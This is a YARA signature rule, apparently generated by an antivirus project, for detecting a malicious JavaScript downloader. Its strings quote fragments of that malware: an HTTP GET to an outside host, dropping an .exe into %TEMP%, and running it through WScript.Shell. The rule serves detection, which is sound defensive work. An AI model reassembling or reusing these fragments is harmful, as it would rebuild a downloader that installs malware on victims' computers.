rule sig_20160328_998786d0adf349e8082a7ec9763a9913 {
  meta:
    description = "datamaliciousorder - file 20160328_998786d0adf349e8082a7ec9763a9913.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f85a5177a3d8d92e35cc7571502c714144edd45eaa9d7ed70730f7b8e67ff873"

  strings:
    $s1  = "function Evnxkpi() {return Clrhshtx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VnKy9uEmejwH.exe\";};" fullword ascii
    $s2  = "Vregcqnk[Ibxgsdpuk](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Jigrswsv](Jufbneewpv() * 11)} while (Vregcqnk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Kceczdoyvb(Wsymukip, Vljjvxmuqh){return Wsymukip - Vljjvxmuqh;};" fullword ascii
    $s5  = "var Clrhshtx = function Ddoie() {return WScript[Szludexuyu](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xscvgg() {return ((Ckooqwwa == true) && (Ckooqwwa == Vljgqsuz)) ? 1 : Cpopg;};" fullword ascii
    $s7  = "function Xwxezb(Mupuxg){Clrhshtx[\"Run\"](Mupuxg, Cpopg, Cpopg);};" fullword ascii
    $s8  = "var Vljgqsuz = false;" fullword ascii
    $s9  = "function Jufbneewpv(){return 22;};" fullword ascii
    $s10 = "var Kyfpzsxyu = new this[\"Date\"]();" fullword ascii
    $s11 = "return Kceczdoyvb(Mfnisfnmd, Qkfjs);" fullword ascii
    $s12 = "var Ckooqwwa = false;" fullword ascii
    $s13 = "Vljgqsuz = true; " fullword ascii
    $s14 = "var Lrxeripuu = false;" fullword ascii
    $s15 = "function Bjupfc(Jjhxu) {var Hrily = (1, 2, 3, 4, 5, Jjhxu); return Hrily;};" fullword ascii
    $s16 = "function Eesbumbmp(){return Szludexuyu;};" fullword ascii
    $s17 = "Ckooqwwa = true; " fullword ascii
    $s18 = " while (Flegh){" fullword ascii
    $s19 = "function Lgvysshvc(){return Vvybxatsx;};" fullword ascii
    $s20 = "function Ysbrrfy()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}